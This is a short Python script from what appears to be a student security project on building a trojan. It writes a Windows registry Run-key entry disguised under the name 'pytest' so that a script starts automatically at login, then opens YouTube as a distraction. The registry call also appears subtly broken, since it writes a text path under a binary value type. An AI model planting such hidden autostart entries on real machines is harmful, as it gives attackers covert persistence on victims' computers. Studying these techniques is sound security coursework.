import winreg, webbrowser
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',winreg.KEY_SET_VALUE)
winreg.SetValueEx(key,'pytest',0,winreg.REG_BINARY,'C:\\Users\\rvm85\\OneDrive - AP Hogeschool Antwerpen\\Documenten\\AP school\\3itcsc1\\Security project trojan\\ProjectFolder\\Testing\\RegExe.py') 
key.Close()
webbrowser.open('www.youtube.com')